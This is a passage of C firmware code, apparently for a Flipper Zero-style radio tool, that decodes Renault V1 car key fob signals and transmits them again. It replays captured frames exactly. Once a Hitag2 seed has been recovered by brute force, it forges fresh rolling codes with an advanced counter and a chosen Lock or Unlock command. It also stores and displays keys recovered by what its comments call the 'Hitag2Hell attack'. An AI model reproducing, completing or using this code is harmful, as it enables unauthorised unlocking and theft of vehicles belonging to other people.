        instance->generic.cnt,
        instance->generic.btn,
        instance->seed,
        out,
        iv);

    uint64_t data = 0ULL;
    uint32_t key2 = 0U;
    renault_v1_seed_unpack_frame(out, &data, &key2);
    instance->generic.data = data;
    instance->key2 = key2;
    instance->seed = hitag2_seed_from_iv(iv);
    instance->generic.seed = instance->seed;
    return true;
}

// ---------------------------------------------------------------------------
// Encoder (emulation): REPLAY only.
//
// V1 has NO matrix crypto, so there is no rolling re-encode. We rebuild the
// 82-bit body byte-identically from data+key2 using the non-13 preamble-based
// upload shape (te_short = preamble==12 ? 140 : 125, te_long = 2x, burst_count
// = 3, inter_burst_low = 1500, final_low = 1500). This matches how V0 already
// treats the non-13 variants (replay).
// ---------------------------------------------------------------------------

static bool
    renault_v1_upload_shape_for_preamble(uint8_t preamble_bits, RenaultV1UploadShape* shape) {
    furi_check(shape);

    if(!renault_v1_preamble_bits_valid(preamble_bits)) {
        return false;
    }

    shape->preamble_pairs = preamble_bits;
    shape->burst_count = 3U;
    shape->te_short = renault_v1_upload_te_for_preamble(preamble_bits);
    shape->inter_burst_low = 1500U;
    shape->final_low = 1500U;
    return true;
}

static uint32_t renault_v1_upload_te_for_preamble(uint8_t preamble_bits) {
    if(preamble_bits == 12U) {
        return RENAULT_V1_TE_PREAMBLE_12_US;
    }
    return RENAULT_V1_TE_DEFAULT_US;
}

static bool renault_v1_emit(
    SubGhzProtocolEncoderRenaultV1* instance,
    size_t* index,
    bool level,
    uint32_t duration) {
    furi_check(instance);
    furi_check(index);

    size_t idx = *index;
    if(idx > 0 && level_duration_get_level(instance->encoder.upload[idx - 1]) == level) {
        uint32_t prev = level_duration_get_duration(instance->encoder.upload[idx - 1]);
        instance->encoder.upload[idx - 1] = level_duration_make(level, prev + duration);
        *index = idx;
        return true;
    }

    if(idx >= RENAULT_V1_UPLOAD_CAPACITY) {
        return false;
    }
    instance->encoder.upload[idx] = level_duration_make(level, duration);
    *index = idx + 1;
    return true;
}

static bool renault_v1_emit_decoded_bit(
    SubGhzProtocolEncoderRenaultV1* instance,
    size_t* index,
    uint8_t* state,
    uint32_t te_short,
    bool bit) {
    furi_check(state);

    const uint32_t te_long = te_short * 2U;

    if(*state == 1U) {
        if(bit) {
            return renault_v1_emit(instance, index, false, te_short) &&
                   renault_v1_emit(instance, index, true, te_short);
        }

        *state = 2U;
        return renault_v1_emit(instance, index, false, te_long);
    }

    if(bit) {
        *state = 1U;
        return renault_v1_emit(instance, index, true, te_long);
    }

    return renault_v1_emit(instance, index, true, te_short) &&
           renault_v1_emit(instance, index, false, te_short);
}

static bool
    renault_v1_build_upload(SubGhzProtocolEncoderRenaultV1* instance, uint8_t preamble_bits) {
    furi_check(instance);

    RenaultV1UploadShape shape;
    if(!renault_v1_upload_shape_for_preamble(preamble_bits, &shape)) {
        return false;
    }

    size_t write_index = 0U;
    for(uint8_t burst = 0U; burst < shape.burst_count; burst++) {
        if(!renault_v1_emit(instance, &write_index, true, 1000U)) {
            return false;
        }

        uint8_t state = 1U;
        for(uint8_t pair = 0U; pair < shape.preamble_pairs; pair++) {
            if(!renault_v1_emit_decoded_bit(instance, &write_index, &state, shape.te_short, true)) {
                return false;
            }
        }

        for(uint8_t bit_index = 0U; bit_index < RENAULT_V1_MIN_BITS; bit_index++) {
            const bool bit =
                renault_v1_get_bit_msb82(instance->generic.data, instance->key2, bit_index);
            if(!renault_v1_emit_decoded_bit(instance, &write_index, &state, shape.te_short, bit)) {
                return false;
            }
        }

        if(state == 2U) {
            if(!renault_v1_emit(instance, &write_index, true, shape.te_short)) {
                return false;
            }
        }

        const uint32_t trailing_low =
            (burst + 1U < shape.burst_count) ? shape.inter_burst_low : shape.final_low;
        if(!renault_v1_emit(instance, &write_index, false, trailing_low)) {
            return false;
        }
    }

    instance->encoder.size_upload = write_index;
    instance->encoder.front = 0U;
    return true;
}

void* subghz_protocol_encoder_renault_v1_alloc(SubGhzEnvironment* environment) {
    UNUSED(environment);

    SubGhzProtocolEncoderRenaultV1* instance = calloc(1, sizeof(SubGhzProtocolEncoderRenaultV1));
    furi_check(instance);

    instance->base.protocol = &renault_v1_protocol;
    instance->generic.protocol_name = instance->base.protocol->name;
    instance->encoder.repeat = 1U;
    instance->encoder.front = 0;
    instance->encoder.is_running = false;
    instance->encoder.upload = malloc(RENAULT_V1_UPLOAD_CAPACITY * sizeof(LevelDuration));
    furi_check(instance->encoder.upload);
    instance->seed_recovered = HITAG2_SEED_RECOVERED_NO;
    instance->seed = 0U;

    return instance;
}

void subghz_protocol_encoder_renault_v1_free(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderRenaultV1* instance = context;
    free(instance->encoder.upload);
    free(instance);
}

void subghz_protocol_encoder_renault_v1_stop(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderRenaultV1* instance = context;
    instance->encoder.is_running = false;
    instance->encoder.front = 0;
}

LevelDuration subghz_protocol_encoder_renault_v1_yield(void* context) {
    furi_assert(context);
    SubGhzProtocolEncoderRenaultV1* instance = context;

    if(!instance->encoder.is_running || instance->encoder.repeat == 0 ||
       instance->encoder.size_upload == 0) {
        instance->encoder.is_running = false;
        return level_duration_reset();
    }

    LevelDuration ret = instance->encoder.upload[instance->encoder.front];

    if(++instance->encoder.front == instance->encoder.size_upload) {
        if(!subghz_block_generic_global.endless_tx) instance->encoder.repeat--;
        instance->encoder.front = 0;
    }

    return ret;
}

SubGhzProtocolStatus
    subghz_protocol_encoder_renault_v1_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_assert(context);

    SubGhzProtocolEncoderRenaultV1* instance = context;
    SubGhzProtocolStatus ret = SubGhzProtocolStatusError;

    instance->encoder.is_running = false;
    instance->encoder.front = 0;

    do {
        flipper_format_rewind(flipper_format);
        FuriString* temp_str = furi_string_alloc();
        if(!temp_str) break;
        if(!flipper_format_read_string(flipper_format, "Protocol", temp_str)) {
            furi_string_free(temp_str);
            break;
        }
        if(!furi_string_equal(temp_str, instance->base.protocol->name)) {
            furi_string_free(temp_str);
            break;
        }
        furi_string_free(temp_str);

        flipper_format_rewind(flipper_format);
        SubGhzProtocolStatus load_st = subghz_block_generic_deserialize_check_count_bit(
            &instance->generic, flipper_format, RENAULT_V1_MIN_BITS);
        if(load_st != SubGhzProtocolStatusOk) {
            break;
        }

        if(!flipper_format_rewind(flipper_format)) {
            break;
        }

        uint32_t key2 = 0U;
        if(!flipper_format_read_uint32(flipper_format, RENAULT_V1_KEY2_FIELD, &key2, 1)) {
            break;
        }
        instance->key2 = key2;
        const uint64_t captured_data = instance->generic.data;
        const uint32_t captured_key2 = instance->key2;

        uint32_t preamble_bits = 0U;
        flipper_format_rewind(flipper_format);
        if(flipper_format_read_uint32(
               flipper_format, RENAULT_V1_PREAMBLE_FIELD, &preamble_bits, 1) &&
           renault_v1_preamble_bits_valid((uint8_t)preamble_bits)) {
            instance->preamble_bits = (uint8_t)preamble_bits;
        } else {
            instance->preamble_bits = 0U;
        }

        uint32_t serial = 0;
        uint8_t button = 0;
        uint8_t counter = 0;
        renault_v1_parse_fields(instance->generic.data, &serial, &button, &counter);
        const uint32_t captured_serial = serial;
        const uint8_t captured_button = button;
        const uint8_t captured_counter = counter;

        // [HITAG2_SEED] Load the classic-Hitag2 recovered marker + 4-byte SEED.
        // When a valid SEED is present the encoder can forward re-encode a NEXT
        // code (real forward encryption) instead of a plain replay.
        renault_v1_read_recovered_and_seed(
            flipper_format, &instance->seed_recovered, &instance->seed);

        RenaultV1DecodeAttempt captured_attempt = {0};
        if(!renault_v1_classify_frame(captured_data, captured_key2, &captured_attempt)) {
            break;
        }
        const RenaultV1TypeId captured_type = captured_attempt.type_id;
        if(instance->preamble_bits == 0U) {
            instance->preamble_bits = renault_v1_default_preamble_bits(captured_type);
        }
        captured_attempt.preamble_bits = instance->preamble_bits;
        if(!renault_v1_preamble_bits_valid(instance->preamble_bits)) {
            break;
        }

        // [PROTOPIRATE_PORT] custom_btn support (replay-only, byte-identical).
        //
        // Renault V1 is REPLAY-ONLY. It cannot yet re-encode a new button or
        // counter into a valid frame because:
        //   - the 32-bit hop's slice within the 42-bit payload is not validated
        //     against a real capture,
        //   - the IV combo is likewise unvalidated,
        //   - there is no payload/counter writer and no checksum re-fixer.
        //
        // Therefore we DISABLE the directional D-pad by calling set_max(0).
        // subghz_custom_btn_is_allowed() returns (custom_btn_max_btns != 0), so
        // max==0 makes is_allowed()==false. The transmitter view gates the
        // Up/Down/Left/Right handling behind is_allowed() (see
        // applications/main/subghz/views/transmitter.c), so with max==0 the UI
        // no longer offers directional buttons that silently do nothing — only
        // OK is presented, which replays the captured frame exactly. This makes
        // the UX honest: OK == replay captured button, nothing misleading.
        //
        // set_original is still recorded for the (currently inert) directional
        // path and is harmless when disabled; keeping it avoids touching the
        // OK/replay path.
        //
        // TODO(renault_v1): the Fiat-BCM hop slice within the 42-bit payload and
        // the IV combo remain unvalidated for that path. The classic-Hitag2 SEED
        // model below provides a REAL forward re-encoder when a SEED is available.
        //
        // [HITAG2_SEED] If a 4-byte SEED was recovered (classic cipher), enable
        // the directional D-pad so a NEXT code with a new button/counter can be
        // forward-encoded. Otherwise stay REPLAY-ONLY and disable the D-pad.
        const bool seed_tx = (instance->seed_recovered == HITAG2_SEED_RECOVERED_YES);

        // Start from the captured frame. For the SEED path we forward re-encode
        // below; for replay we reproduce the captured frame byte-identically.
        instance->tx_button = captured_button;
        serial = captured_serial;
        counter = captured_counter;
        instance->generic.data = captured_data;
        instance->key2 = captured_key2;

        // [CAR_EMULATE_FIX] Read the Serial/Btn/Cnt overrides written by the
        // car-emulate scene. subghz_block_generic_deserialize() only reads
        // Key/Bit, so without this the base counter always came from the packed
        // Key (captured_counter) and the SEED path did captured_counter+1 on
        // EVERY TX — re-sending the SAME "next" code. Reading "Cnt" here makes
        // the base counter track the scene so repeated TX truly advances.
        uint8_t override_button = captured_button;
        {
            uint32_t serial_u32 = serial;
            uint32_t btn_u32 = captured_button;
            uint32_t cnt_u32 = counter;

            flipper_format_rewind(flipper_format);
            const bool got_serial =
                flipper_format_read_uint32(flipper_format, "Serial", &serial_u32, 1);
            flipper_format_rewind(flipper_format);
            const bool got_btn = flipper_format_read_uint32(flipper_format, "Btn", &btn_u32, 1);
            flipper_format_rewind(flipper_format);
            const bool got_cnt = flipper_format_read_uint32(flipper_format, "Cnt", &cnt_u32, 1);

            if(got_serial) serial = serial_u32 & 0x00FFFFFFU;
            if(got_btn) override_button = (uint8_t)btn_u32;
            if(got_cnt) counter = (uint8_t)(cnt_u32 & 0xFFU);
        }

        // [CAR_EMULATE_FIX] custom_btn mapping.
        //
        // REPLAY path (no SEED): we cannot re-encode a new button into a valid
        // frame, so keep set_max(0) which makes subghz_custom_btn_is_allowed()
        // false. The transmitter view then only offers OK == byte-identical
        // replay of the captured button (honest UX, no dead directions).
        //
        // SEED path: a recovered 4-byte SEED lets hitag2_seed_encrypt_frame()
        // forward-encrypt ANY button. set_max(4) makes every D-pad direction
        // reachable and we map the selection onto the type's valid button range.
        {
            const uint8_t original_btn = captured_button;
            if(subghz_custom_btn_get_original() == 0) {
                subghz_custom_btn_set_original(original_btn);
            }
            subghz_custom_btn_set_max(seed_tx ? 4U : 0U);

            if(seed_tx) {
                // Renault V1 non-13 buttons: low nibble 0x04..0x07 = Lock,
                // 0x08..0x0B = Unlock (see renault_v1_get_button_name). Preserve
                // the captured high nibble (type base) and only swap the action
                // nibble so the frame stays a valid member of its type family.
                const uint8_t base = (uint8_t)(override_button & 0xF0U);
                uint8_t action = (uint8_t)(override_button & 0x0FU);
                switch(subghz_custom_btn_get()) {
                case SUBGHZ_CUSTOM_BTN_UP:
                    action = 0x04U; // Lock
                    break;
                case SUBGHZ_CUSTOM_BTN_DOWN:
                    action = 0x08U; // Unlock
                    break;
                case SUBGHZ_CUSTOM_BTN_LEFT:
                    action = 0x05U; // Lock variant
                    break;
                case SUBGHZ_CUSTOM_BTN_RIGHT:
                    action = 0x09U; // Unlock variant
                    break;
                case SUBGHZ_CUSTOM_BTN_OK:
                default:
                    // OK: keep the (file/captured) button unchanged.
                    break;
                }
                if(subghz_custom_btn_get() != SUBGHZ_CUSTOM_BTN_OK) {
                    override_button = (uint8_t)(base | action);
                }
            }
        }

        instance->tx_button = override_button;
        instance->packet_bit_count = RENAULT_V1_MIN_BITS;
        instance->generic.data_count_bit = RENAULT_V1_MIN_BITS;
        instance->generic.serial = serial;
        instance->generic.btn = instance->tx_button;
        instance->generic.cnt = counter;

        // [HITAG2_SEED] Forward re-encode a NEXT code when a SEED is available.
        // We advance the (scene-tracked) counter by one and encrypt a fresh frame
        // with the recovered seed. Failure is graceful: fall back to the
        // captured replay frame + button.
        if(seed_tx) {
            instance->generic.cnt = (counter + 1U) & 0xFFU;
            if(renault_v1_encoder_reencode_seed(instance)) {
                instance->generic.data_count_bit = RENAULT_V1_MIN_BITS;
                instance->packet_bit_count = RENAULT_V1_MIN_BITS;
            } else {
                // Recovered flag but re-encode failed: revert to captured replay.
                instance->tx_button = captured_button;
                instance->generic.btn = captured_button;
                instance->generic.cnt = counter;
                instance->generic.data = captured_data;
                instance->key2 = captured_key2;
            }
        }

        uint32_t tx_repeat = RENAULT_V1_REPLAY_REPEAT;
        flipper_format_rewind(flipper_format);
        flipper_format_read_uint32(flipper_format, "Repeat", &tx_repeat, 1);
        if(tx_repeat < RENAULT_V1_REPLAY_REPEAT) {
            tx_repeat = RENAULT_V1_REPLAY_REPEAT;
        }
        instance->encoder.repeat = tx_repeat;

        if(!renault_v1_build_upload(instance, instance->preamble_bits)) {
            break;
        }
        if(instance->encoder.size_upload == 0) {
            break;
        }

        instance->encoder.is_running = true;
        ret = SubGhzProtocolStatusOk;
    } while(false);

    return ret;
}

void* subghz_protocol_decoder_renault_v1_alloc(SubGhzEnvironment* environment) {
    UNUSED(environment);

    SubGhzProtocolDecoderRenaultV1* instance = calloc(1, sizeof(SubGhzProtocolDecoderRenaultV1));
    furi_check(instance);

    instance->base.protocol = &renault_v1_protocol;
    instance->generic.protocol_name = instance->base.protocol->name;
    instance->manchester_state = 1U;

    return instance;
}

void subghz_protocol_decoder_renault_v1_reset(void* context) {
    furi_assert(context);

    SubGhzProtocolDecoderRenaultV1* instance = context;
    instance->decoder.parser_step = RenaultV1DecoderStepReset;
    instance->manchester_state = 1U;
    instance->decoded_bit_count = 0U;
    instance->key2 = 0U;
    instance->type_id = RenaultV1TypeUnknown;
    instance->type_tag = 0U;
    instance->preamble_bits = 0U;
    instance->pending_attempt_valid = false;
    instance->hitag2_key_valid = false;
    instance->hitag2_epoch = 0U;
    instance->hitag2_hop_slice = 0U;
    instance->hitag2_iv_combo = 0U;
    instance->hitag2_hop = 0U;
    memset(instance->hitag2_key, 0, sizeof(instance->hitag2_key));
    instance->seed_recovered = HITAG2_SEED_RECOVERED_NO;
    instance->seed = 0U;
}

void subghz_protocol_decoder_renault_v1_feed(void* context, bool level, uint32_t duration) {
    furi_assert(context);

    SubGhzProtocolDecoderRenaultV1* instance = context;
    uint8_t event_code = 0U;

    if(instance->decoder.parser_step == RenaultV1DecoderStepReset) {
        if(level && (duration >= RENAULT_V1_SYNC_MIN_US)) {
            instance->decoder.parser_step = RenaultV1DecoderStepData;
            instance->decoded_bit_count = 0U;
            instance->manchester_state = 1U;
        }
        return;
    }

    if(renault_v1_is_end_burst(level, duration, instance->decoded_bit_count)) {
        renault_v1_decode_candidate(instance);
        instance->decoder.parser_step = RenaultV1DecoderStepReset;
        return;
    }

    if(duration >= RENAULT_V1_GAP_RESET_US) {
        renault_v1_decode_candidate(instance);
        instance->decoder.parser_step = RenaultV1DecoderStepReset;
        if(level && (duration >= RENAULT_V1_SYNC_MIN_US)) {
            instance->decoder.parser_step = RenaultV1DecoderStepData;
            instance->decoded_bit_count = 0U;
            instance->manchester_state = 1U;
        }
        return;
    }

    if(instance->decoded_bit_count > RENAULT_V1_DECODER_BIT_LIMIT) {
        renault_v1_decode_candidate(instance);
        instance->decoder.parser_step = RenaultV1DecoderStepReset;
        return;
    }

    if(!renault_v1_classify_event(duration, level, &event_code)) {
        const bool starts_next_burst = level && (duration >= RENAULT_V1_SYNC_MIN_US);
        renault_v1_decode_candidate(instance);
        if(starts_next_burst) {
            instance->decoder.parser_step = RenaultV1DecoderStepData;
            instance->decoded_bit_count = 0U;
            instance->manchester_state = 1U;
        } else {
            instance->decoder.parser_step = RenaultV1DecoderStepReset;
        }
        return;
    }

    const uint8_t state = instance->manchester_state & 0x03U;
    uint8_t next_state = (renault_v1_decoder_state_table[state] >> event_code) & 0x03U;
    if(next_state == state) {
        return;
    }

    instance->manchester_state = next_state;
    if((next_state == 1U) || (next_state == 2U)) {
        const uint8_t bit = (next_state == 1U) ? 1U : 0U;
        const uint8_t bit_offset = instance->decoded_bit_count;
        instance->decoded_bit_count = bit_offset + 1U;
        instance->decoded_bits[bit_offset] = bit;
    }
}

static uint32_t renault_v1_arm_lsl(uint32_t value, uint32_t shift) {
    shift &= 0xFFU;
    if(shift >= 32U) {
        return 0U;
    }
    return value << shift;
}

static uint32_t renault_v1_arm_lsr(uint32_t value, uint32_t shift) {
    shift &= 0xFFU;
    if(shift >= 32U) {
        return 0U;
    }
    return value >> shift;
}

uint8_t subghz_protocol_decoder_renault_v1_get_hash_data(void* context) {
    furi_assert(context);

    SubGhzProtocolDecoderRenaultV1* instance = context;
    const uint32_t low = (uint32_t)instance->decoder.decode_data;
    const uint32_t high = (uint32_t)(instance->decoder.decode_data >> 32U);

    uint32_t hash = 0U;
    for(uint32_t shift = 0U; shift < 0x38U; shift += 8U) {
        uint32_t mixed = renault_v1_arm_lsr(low, shift);
        mixed |= renault_v1_arm_lsl(high, 32U - shift);
        mixed |= renault_v1_arm_lsr(high, shift - 32U);

        hash ^= mixed;
        hash = ((hash << 1U) & 0xFEU) | ((hash >> 7U) & 1U);
    }

    const uint32_t key2_mix = instance->key2 ^ (instance->key2 >> 2U) ^ (instance->key2 >> 10U);
    return (uint8_t)(hash ^ key2_mix);
}

static const char* renault_v1_get_button_name(uint8_t button) {
    const uint8_t low_nibble = button & 0x0FU;
    if((low_nibble >= 0x04U) && (low_nibble <= 0x07U)) {
        return "Lock";
    }
    if((low_nibble >= 0x08U) && (low_nibble <= 0x0BU)) {
        return "Unlock";
    }
    return "??";
}

void subghz_protocol_decoder_renault_v1_get_string(void* context, FuriString* output) {
    furi_assert(context);

    SubGhzProtocolDecoderRenaultV1* instance = context;

    // Key line: the 6-byte hitag2 key recovered by the Hitag2Hell attack, or "?"
    // when it has not been recovered yet (capture without a matching key/slice).
    if(instance->hitag2_key_valid) {
        furi_string_cat_printf(
            output,
            "%s %dbit\r\n"
            "Key:%02X%02X%02X%02X%02X%02X\r\n"
            "SN:0x%lX Btn:[%s]\r\n"
            "CRC:%s Cnt:%02lX",
            instance->generic.protocol_name,
            instance->packet_bit_count,
            instance->hitag2_key[0],
            instance->hitag2_key[1],
            instance->hitag2_key[2],
            instance->hitag2_key[3],
            instance->hitag2_key[4],
            instance->hitag2_key[5],
            instance->generic.serial,
            renault_v1_get_button_name(instance->generic.btn),
            (instance->check_c1 || instance->check_c2) ? "ERR" : "OK",
            instance->generic.cnt);
    } else {
        furi_string_cat_printf(
            output,
            "%s %dbit\r\n"
            "Key:?\r\n"
            "SN:0x%lX Btn:[%s]\r\n"
            "CRC:%s Cnt:%02lX",
            instance->generic.protocol_name,
            instance->packet_bit_count,
            instance->generic.serial,
            renault_v1_get_button_name(instance->generic.btn),
            (instance->check_c1 || instance->check_c2) ? "ERR" : "OK",
            instance->generic.cnt);
    }

    // [HITAG2_SEED] classic-Hitag2 4-byte SEED status (separate from the key line
    // above). When recovered, the encoder can forward re-encode a NEXT code.
    if(instance->seed_recovered == HITAG2_SEED_RECOVERED_YES) {
        furi_string_cat_printf(output, "\r\nSeed:%08lX", (unsigned long)instance->seed);
    } else if(instance->seed_recovered == HITAG2_SEED_RECOVERED_BF_MISS) {
        furi_string_cat_printf(output, "\r\nSeed:BF miss");
    }
}

SubGhzProtocolStatus subghz_protocol_decoder_renault_v1_serialize(
    void* context,
    FlipperFormat* flipper_format,
    SubGhzRadioPreset* preset) {
    furi_assert(context);

    SubGhzProtocolDecoderRenaultV1* instance = context;
    instance->generic.data_count_bit = instance->packet_bit_count;

    SubGhzProtocolStatus status =
        subghz_block_generic_serialize(&instance->generic, flipper_format, preset);
    if(status != SubGhzProtocolStatusOk) {
        return status;
    }

    if(!flipper_format_write_uint32(flipper_format, RENAULT_V1_KEY2_FIELD, &instance->key2, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    const uint32_t preamble_bits = instance->preamble_bits;
    if(!flipper_format_write_uint32(
           flipper_format, RENAULT_V1_PREAMBLE_FIELD, &preamble_bits, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    if(!flipper_format_write_uint32(flipper_format, "Serial", &instance->generic.serial, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }
    uint32_t btn_u32 = instance->generic.btn;
    if(!flipper_format_write_uint32(flipper_format, "Btn", &btn_u32, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }
    uint32_t cnt_u32 = instance->generic.cnt;
    if(!flipper_format_write_uint32(flipper_format, "Cnt", &cnt_u32, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    // [HITAG2_BF] Persist the recovered key + slice + combo so emulation and the
    // BF scene know which candidate reproduces the hop. All reads are optional on
    // load, so old .sub files without these fields still deserialize fine.
    if(instance->hitag2_key_valid) {
        uint32_t hop = instance->hitag2_hop;
        uint32_t epoch = instance->hitag2_epoch & 0x3FFFFUL;
        uint32_t iv_combo = instance->hitag2_iv_combo;
        uint32_t slice = instance->hitag2_hop_slice;
        if(!flipper_format_write_uint32(flipper_format, RENAULT_V1_HOP_FIELD, &hop, 1) ||
           !flipper_format_insert_or_update_hex(
               flipper_format, RENAULT_V1_HITAG2_KEY_FIELD, instance->hitag2_key, 6U) ||
           !flipper_format_write_uint32(
               flipper_format, RENAULT_V1_HITAG2_EPOCH_FIELD, &epoch, 1) ||
           !flipper_format_write_uint32(flipper_format, RENAULT_V1_HITAG2_IV_FIELD, &iv_combo, 1) ||
           !flipper_format_write_uint32(
               flipper_format, RENAULT_V1_HITAG2_SLICE_FIELD, &slice, 1)) {
            return SubGhzProtocolStatusErrorParserOthers;
        }
    }

    // [HITAG2_SEED] Persist the classic-Hitag2 recovered marker + 4-byte SEED so
    // the encoder can forward re-encode a NEXT code. Written independently of the
    // Fiat-BCM key above. Both markers and SEED are OPTIONAL on load.
    {
        uint8_t recovered_hex = instance->seed_recovered;
        if(!flipper_format_insert_or_update_hex(
               flipper_format, RENAULT_V1_RECOVERED_FIELD, &recovered_hex, 1)) {
            return SubGhzProtocolStatusErrorParserOthers;
        }
        if(instance->seed_recovered == HITAG2_SEED_RECOVERED_YES) {
            uint8_t seed_be[4] = {
                (uint8_t)(instance->seed >> 24U),
                (uint8_t)(instance->seed >> 16U),
                (uint8_t)(instance->seed >> 8U),
                (uint8_t)instance->seed,
            };
            if(!flipper_format_insert_or_update_hex(
                   flipper_format, RENAULT_V1_SEED_FIELD, seed_be, 4U)) {
                return SubGhzProtocolStatusErrorParserOthers;
            }
        }
    }

    return SubGhzProtocolStatusOk;
}

// [HITAG2_SEED] Read back the classic-Hitag2 "Recovered" marker + 4-byte "Seed".
// Both are optional; when absent, recovered defaults to NO and seed to 0.
static void renault_v1_read_recovered_and_seed(
    FlipperFormat* flipper_format,
    uint8_t* recovered,
    uint32_t* seed) {
    *recovered = HITAG2_SEED_RECOVERED_NO;
    *seed = 0U;

    uint8_t recovered_hex = 0;
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_hex(flipper_format, RENAULT_V1_RECOVERED_FIELD, &recovered_hex, 1)) {
        *recovered = recovered_hex;
    } else {
        uint32_t recovered_u32 = 0;
        flipper_format_rewind(flipper_format);
        if(flipper_format_read_uint32(
               flipper_format, RENAULT_V1_RECOVERED_FIELD, &recovered_u32, 1)) {
            *recovered = (uint8_t)recovered_u32;
        }
    }

    uint8_t seed_be[4] = {0};
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_hex(flipper_format, RENAULT_V1_SEED_FIELD, seed_be, 4)) {
        *seed = ((uint32_t)seed_be[0] << 24U) | ((uint32_t)seed_be[1] << 16U) |
                ((uint32_t)seed_be[2] << 8U) | seed_be[3];
        return;
    }

    flipper_format_rewind(flipper_format);
    flipper_format_read_uint32(flipper_format, RENAULT_V1_SEED_FIELD, seed, 1);
}

SubGhzProtocolStatus
    subghz_protocol_decoder_renault_v1_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_assert(context);

    SubGhzProtocolDecoderRenaultV1* instance = context;
    SubGhzProtocolStatus status = subghz_block_generic_deserialize_check_count_bit(
        &instance->generic, flipper_format, RENAULT_V1_MIN_BITS);
    if(status != SubGhzProtocolStatusOk) {
        return status;
    }

    uint32_t key2 = 0U;
    if(!flipper_format_read_uint32(flipper_format, RENAULT_V1_KEY2_FIELD, &key2, 1)) {
        return SubGhzProtocolStatusError;
    }

    instance->key2 = key2;
    uint32_t preamble_bits = 0U;
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_uint32(flipper_format, RENAULT_V1_PREAMBLE_FIELD, &preamble_bits, 1) &&
       renault_v1_preamble_bits_valid((uint8_t)preamble_bits)) {
        instance->preamble_bits = (uint8_t)preamble_bits;
    } else {
        instance->preamble_bits = 0U;
    }

    instance->packet_bit_count = RENAULT_V1_MIN_BITS;
    instance->generic.data_count_bit = RENAULT_V1_MIN_BITS;
    instance->decoder.decode_data = instance->generic.data;
    instance->decoder.decode_count_bit = RENAULT_V1_MIN_BITS;

    uint8_t button = 0;
    uint32_t serial = 0;
    uint8_t counter = 0;
    renault_v1_parse_fields(instance->generic.data, &serial, &button, &counter);
    instance->generic.serial = serial;
    instance->generic.btn = button;
    instance->generic.cnt = counter;

    RenaultV1DecodeAttempt attempt = {0};
    // Re-run classify; this REJECTS 0x13 (belongs to Renault V0).
    if(renault_v1_classify_frame(instance->generic.data, instance->key2, &attempt)) {
        instance->type_id = attempt.type_id;
        instance->type_tag = attempt.type_tag;
        if(instance->preamble_bits == 0U) {
            instance->preamble_bits = renault_v1_default_preamble_bits(attempt.type_id);
        }
        instance->check_c1 = !attempt.c1_ok;
        instance->check_c2 = !attempt.c2_ok;
    } else {
        instance->type_id = RenaultV1TypeUnknown;
        instance->type_tag = 0U;
        instance->check_c1 = true;
        instance->check_c2 = true;
    }

    // [HITAG2_BF] Re-run the auto-detect to recover the key from the stored
    // fields. This overwrites any stale state; the stored Hitag2 Key/IV/Slice
    // (all optional) are used only to confirm the same match below.
    renault_v1_verify_hitag2_key(instance);

    // If the .sub explicitly carries a key + slice + IV combo, read them back
    // and re-verify. All reads are optional so old files still load.
    uint8_t key[6] = {0};
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_hex(flipper_format, RENAULT_V1_HITAG2_KEY_FIELD, key, 6U)) {
        uint32_t iv_combo = 0U;
        flipper_format_rewind(flipper_format);
        if(!flipper_format_read_uint32(flipper_format, RENAULT_V1_HITAG2_IV_FIELD, &iv_combo, 1U)) {
            iv_combo = 0U;
        }
        uint32_t slice = 0U;
        flipper_format_rewind(flipper_format);
        if(!flipper_format_read_uint32(
               flipper_format, RENAULT_V1_HITAG2_SLICE_FIELD, &slice, 1U)) {
            slice = 0U;
        }
        iv_combo &= (RENAULT_V1_IV_COMBO_COUNT - 1U);
        if(slice < RENAULT_V1_HOP_SLICE_COUNT) {
            const uint32_t uid = instance->generic.serial & 0xFFFFFFUL;
            const uint64_t payload42 =
                subghz_protocol_renault_v1_payload42(instance->generic.data, instance->key2);
            const uint32_t hop =
                subghz_protocol_renault_v1_candidate_hop(payload42, (uint8_t)slice);
            const uint8_t iv_btn =
                subghz_protocol_renault_v1_iv_button(instance->generic.btn, (uint8_t)iv_combo);
            const uint16_t iv_ctrl =
                subghz_protocol_renault_v1_iv_control(instance->generic.cnt, (uint8_t)iv_combo);
            if(subghz_protocol_fiat_v1_compute_auth(uid, iv_btn, iv_ctrl, key, 0U) == hop) {
                memcpy(instance->hitag2_key, key, sizeof(instance->hitag2_key));
                instance->hitag2_key_valid = true;
                instance->hitag2_epoch = 0U;
                instance->hitag2_iv_combo = (uint8_t)iv_combo;
                instance->hitag2_hop_slice = (uint8_t)slice;
                instance->hitag2_hop = hop;
            }
        }
    }

    // [HITAG2_SEED] Load the classic-Hitag2 recovered marker + 4-byte SEED if the
    // .sub already carries them (a previous manual "Seed BF" that was saved). We
    // TRUST a stored SEED and never brute-force on load: the ~0x40000-candidate
    // brute force would freeze the UI when simply opening a signal. If no SEED is
    // stored, we leave it unrecovered here; the user runs it on demand from the
    // "Seed BF" menu (subghz_protocol_renault_v1_run_seed_bf).
    {
        uint8_t stored_recovered = HITAG2_SEED_RECOVERED_NO;
        uint32_t stored_seed = 0U;
        renault_v1_read_recovered_and_seed(
            flipper_format, &stored_recovered, &stored_seed);
        if(stored_recovered == HITAG2_SEED_RECOVERED_YES) {
            instance->seed_recovered = HITAG2_SEED_RECOVERED_YES;
            instance->seed = stored_seed;
            instance->generic.seed = stored_seed;
        } else {
            instance->seed_recovered = HITAG2_SEED_RECOVERED_NO;
            instance->seed = 0U;
            instance->generic.seed = 0U;
        }
    }

    return status;
}
